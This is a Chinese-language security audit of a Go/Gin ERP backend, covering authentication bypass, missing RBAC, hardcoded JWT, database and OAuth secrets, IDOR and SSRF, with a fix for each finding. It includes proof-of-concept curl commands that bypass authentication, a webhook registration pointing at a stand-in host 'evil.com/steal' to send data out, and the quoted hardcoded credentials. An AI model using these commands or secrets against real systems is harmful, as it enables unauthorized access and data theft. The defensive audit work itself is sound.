# 01 · 后端安全与鉴权审计

> 审计范围：`internal/pkg/auth`、`internal/pkg/middleware`、`internal/iam`、`internal/openapi`、`internal/device`、`internal/pkg/{response,errors}`、`configs`、`docker-compose.yml`、`cmd/server/main.go`、`migrations/*.sql`
> 技术栈：Go 1.21 + Gin + GORM + JWT + PostgreSQL + Redis

---

## 严重

### S-1 JWT 认证中间件为空壳——任意字符串即可通过认证
- 文件：`internal/pkg/middleware/middleware.go:82-92`，路由注册 `internal/routes/routes.go:39`

```go
func JWTAuth() gin.HandlerFunc {
    return func(c *gin.Context) {
        token := c.GetHeader("Authorization")
        if token == "" {
            c.JSON(http.StatusUnauthorized, response.Err(10001, "未认证"))
            c.Abort()
            return
        }
        c.Next()  // 直接放行，未调用 auth.ParseToken
    }
}
```

`auth.ParseToken` 存在于 `internal/pkg/auth/auth.go:35` 但从未被调用。所有受"保护"的路由均可被未认证访问。

攻击路径：
```bash
curl -H "Authorization: anything" http://target:8080/api/v1/users
curl -H "Authorization: x" http://target:8080/api/v1/finance/financial-report?period=2026-08
curl -H "Authorization: x" -X POST http://target:8080/api/v1/mdm/materials \
  -d '{"material_code":"HACK","name":"pwned"}'
```

修复：重写 JWTAuth，调用 `auth.ParseToken`，校验签名和过期，将 `user_id/username` 写入 context，去除 `Bearer ` 前缀。

### S-2 无任何权限/角色校验——全部接口水平/垂直越权
- 文件：`internal/routes/routes.go:38-131`，`internal/iam/service/service.go:154-172`

路由组仅使用空壳 `JWTAuth()`，没有任何 `RequirePermission/RequireRole` 中间件。`GetUserPermissions` 仅用于前端展示权限树，服务端从不校验。
- 任意"认证"用户可访问所有接口，包括用户管理、财务报表、采购审批；
- `:id` 参数不检查归属（`GET /users/:id` 可查任意用户）；
- `data_scope` 字段定义但从不用于查询过滤。

修复：实现基于权限码的 RBAC 中间件，路由声明所需权限码；数据查询落地 `data_scope`；`:id` 做归属校验。

### S-3 JWT 密钥硬编码并提交到 Git
- 文件：`configs/config.yaml:28`、`docker-compose.yml:58`、`cmd/server/main.go:80`

```yaml
jwt:
  secret: erp-system-jwt-secret-key-zhouhouping-copyright-2026
```

密钥是确定性、低熵的版权字符串，已入库。`initConfig()` 未调用 `viper.AutomaticEnv()`，compose 里的 `JWT_SECRET` 实际被忽略。

修复：从环境变量/secret manager 读取，启动时强制校验长度 ≥32B；轮换密钥；清理 git 历史。

### S-4 LLM 接口硬编码 fallback 到管理员 (user_id=1)
- 文件：`internal/llm/handler/handler.go:30-33,57-60`

```go
userID := c.GetInt64("user_id")
if userID == 0 {
    userID = 1  // 硬编码 fallback 到 admin
}
```

因 S-1 中间件不设置 user_id，`c.GetInt64` 恒为 0，所有 LLM 请求以 admin 身份执行。结合 IDOR 可查看所有会话。

修复：移除 fallback；中间件正确设置 user_id；user_id 为 0 应拒绝。

### S-5 数据库与 Redis 密码硬编码
- 文件：`internal/pkg/db/db.go:50`、`internal/pkg/redis/redis.go:78`、`docker-compose.yml:10,27,34,51,56`

```go
password := getEnv("DB_PASSWORD", "erp_password_zhouhouping_2026")
password := getEnv("REDIS_PASSWORD", "")  // 默认空密码
```

DB 密码硬编码为默认值；Redis config.yaml 密码为空，与 compose 不一致；端口直接映射宿主。

修复：强随机密码，secret 注入；不要在源码设默认密码；DB 端口仅内网可达。

---

## 高

### H-1 默认管理员账户使用已知 bcrypt 哈希
- 文件：`migrations/0001_init.up.sql:250-251`

```sql
INSERT INTO sys_user (username, password_hash, ...) VALUES
('admin', '$2a$10$N9qo8uLOickgx2ZMRZoMye.IjzqAKL9xL5jvMFVdNJHvGCgTq/VEq', ...);
```

该哈希是公开教程广泛使用的哈希（明文可查），且未强制首登改密。

修复：首次启动随机生成管理员密码；强制首登改密；bcrypt cost ≥12。

### H-2 登录无防爆破/锁定/验证码
- 文件：`internal/iam/service/service.go:76-109`

直接查库比对密码，无失败计数、无锁定、无 IP 限流、无验证码。Redis 仅用于 refresh token。

修复：Redis 记录失败次数，超限锁定/验证码；`golang.org/x/time/rate` IP 限流。

### H-3 LLM 会话历史 IDOR——任意用户可读他人会话
- 文件：`internal/llm/handler/handler.go:44-54`、`internal/llm/repository/repo.go:61-66`

```go
messages, err := h.llmService.GetSessionHistory(c.Request.Context(), sessionID)
// 未校验 session 是否属于当前用户
```

`ListBySessionID` 仅按 `session_id` 过滤，可遍历 ID 读取所有人聊天记录。

修复：查询加 `user_id = ?`；service 校验归属。

### H-4 OpenAPI OAuth Token 校验从未执行——ValidateAccessToken 为死代码
- 文件：`internal/openapi/service/service.go:108-119`、`internal/routes/routes.go:124-129`

`ValidateAccessToken` 已实现但从未被调用；webhook/sync 仅凭 body 中 `client_id` 就操作：
```bash
curl -H "Authorization: x" -X POST .../openapi/webhooks \
  -d '{"client_id":"erp-system-open","event":"*","url":"http://evil.com/steal"}'
```

修复：为 OpenAPI 路由组添加独立 Bearer 中间件；client_id 从 token 取而非 body。

### H-5 OpenAPI client_secret 明文存储 + 硬编码默认客户端
- 文件：`migrations/0002_openapi_device.up.sql:57-58`、`internal/openapi/service/service.go:43`

```sql
('erp-system-open', 'erp-system-secret-zhouhouping-copyright-2026', ...);
```
- 明文 `VARCHAR(128)`；
- `client.ClientSecret != req.ClientSecret` 非常量时间比较；
- scope 不校验，请求传什么就发什么：`return &dto.TokenRes{..., Scope: req.Scope}`。

修复：bcrypt/argon2 哈希；`subtle.ConstantTimeCompare`；删除默认客户端或强制重置；校验 scope。

### H-6 多租户隔离完全未实现
- 文件：`internal/iam/model/model.go:19`，所有 repository

`SysUser.TenantID` 存在但 grep `tenant` 在 internal 除 model 定义外零命中。所有查询不区分租户。

修复：GORM Scopes 自动注入 `tenant_id`；token 中带 tenant_id；创建时自动设置。

### H-7 审计日志模块为死代码——无任何审计记录写入
- 文件：`internal/iam/service/service.go:38,54,68`

`AuditLogRepository` 注入但从不 `.Create()`，`sys_audit_log` 永远为空。

修复：关键操作后调用；建议中间件统一记录请求路径、操作者、IP、参数摘要、结果。

---

## 中

### M-1 UpdateUser 忽略 URL :id，存在 Mass Assignment
- 文件：`internal/iam/handler/handler.go:132-146`、`internal/iam/repository/repo.go:66-68`

```go
c.ShouldBindJSON(&user)              // 不读 c.Param("id")
h.authService.UpdateUser(ctx, &user)
// repo:
r.db.Save(user).Error                 // Save 全字段更新
```

URL 的 `:id` 被忽略，ID 必须从 body 传；可指定任意 ID 修改任意用户；`Save` 覆盖 status/tenant_id 等敏感字段。`UpdateMaterial/UpdateSupplier` 同样问题。

攻击：`PUT /users/999 -d '{"id":2,"username":"victim","status":0}'`

修复：从路径取 ID 强制覆盖 body；DTO 白名单；`Updates` 而非 `Save`。

### M-2 CORS 中间件已定义但从未注册
- 文件：`internal/pkg/middleware/middleware.go:41-60`，`cmd/server/main.go:142`

`CORS()`、`TraceID()`、`Recovery()`、`Timeout()` 均未 `Use()`。`config.yaml` 的 CORS 白名单是死配置。

修复：`r.Use(middleware.TraceID(), middleware.CORS(origins), ...)`。

### M-3 缺少安全响应头
HSTS、X-Frame-Options、X-Content-Type-Options、CSP、X-XSS-Protection 全部缺失。

### M-4 无 CSRF 防护
使用 Bearer token 天然免疫 CSRF；若前端改用 cookie 则需 SameSite + CSRF token。

### M-5 分页参数未做边界校验——可导致 DoS
- 例如 `internal/iam/handler/handler.go:87-88`

```go
page, _ := strconv.Atoi(c.DefaultQuery("page", "1"))
pageSize, _ := strconv.Atoi(c.DefaultQuery("page_size", "20"))
// 无范围校验，DTO binding 对 query 无效
```

`page_size=99999999` 拖库。

### M-6 OpenAPI Webhook URL 用户可控（潜在 SSRF）
- 文件：`internal/openapi/service/service.go:127-133`

未校验 scheme、未过滤内网地址（127.0.0.1/169.254/10/...）。一旦实现投递即 SSRF。

### M-7 所有错误响应返回 HTTP 200
- 文件：所有 handler、`internal/pkg/errors/errors.go:74`

`errors.GetHTTP` 已定义但零调用；`AppError.HTTP` 字段从不使用。WAF/监控无法靠状态码识别攻击。

### M-8 Gin 运行在 debug 模式（release 配置未生效）
- 文件：`configs/config.yaml:7`、`cmd/server/main.go:142`

未调用 `gin.SetMode`，`GIN_MODE` 未设，默认 debug，打印路由和错误详情。

### M-9 config.yaml 含明文密钥并提交 Git
`.gitignore` 只忽略 `config.local.yaml`，`config.yaml` 含 DB 密码、JWT secret 等。

---

## 低

### L-1 依赖库版本过旧
| 依赖 | 当前 | 建议 |
|---|---|---|
| gin | v1.9.1 | v1.10+ |
| golang.org/x/crypto | v0.17.0 | 最新 |
| gorilla/websocket | v1.5.0 | v1.5.3+ |
| golang.org/x/net | v0.22.0 | 最新 |

修复：`go get -u ./... && go mod tidy`，定期 `govulncheck`。

### L-2 数据库连接未启用 SSL
`sslmode: disable`，传输明文。

### L-3 JWT Claims 缺 iss/aud/jti，无法撤销
access token 过期前（2h）始终有效；改密/禁用后旧 token 仍可用；无黑名单。

### L-4 CreateUser 无法设置密码
- 文件：`internal/iam/model/model.go:15`、`internal/iam/service/service.go:210-223`

`PasswordHash` 标 `json:"-"`，service 对空串 bcrypt；登录又 `binding:"required"` → 新用户永远无法登录。

### L-5 无密码复杂度要求

### L-6 OpenAPI Token 明文存数据库、无清理任务
UUID v4 作为 opaque token 可接受，但应做 SHA-256 哈希存储，定期清理过期记录。

### L-7 Refresh Token 轮换存在竞态
Get+Del+Set 非原子；删除失败仅 Warn 不阻断。建议 Lua 脚本。

### L-8 容器以 root 运行
Dockerfile 无 `USER` 指令。

---

## 提示

- **I-1** config.yaml 与 compose 默认密码不一致：本地按 config 建库必连不上。
- **I-2** `main.go:129` `NewQwenGateway("", "qwen-turbo")` 未从 config 读 `llm.api_key`，LLM 始终失败。
- **I-3** 设备模块仅有空壳 JWTAuth，无设备级 API Key/证书；`config.device.websocket_port` 无实现。

---

## 总结

整体处于**不可上线状态**：认证空壳 + 无权限校验 + 硬编码密钥 + 默认管理员凭据，系统等同无认证。多租户、审计日志仅停留在数据模型；OpenAPI/OAuth token 签发后从不校验。SQL 注入方面全部使用 GORM 参数化查询，未发现原始 SQL 拼接，这是少数亮点。

### Top 5 优先修复
1. **S-1 修复 JWTAuth**：调用 ParseToken，写 user_id 到 context。
2. **S-2 实现并强制 RBAC**：路由级权限码 + data_scope + 归属校验。
3. **S-3/S-5/H-1 轮换并外部化所有密钥**：JWT/DB/Redis/admin/OpenAPI secret 全部更换、注入、清理历史。
4. **H-4/H-5 修复 OpenAPI 鉴权链路**：独立 Bearer 中间件、client_id 来自 token、secret 哈希、scope 校验。
5. **H-2/H-7/H-6 防爆破 + 审计日志 + 多租户**。
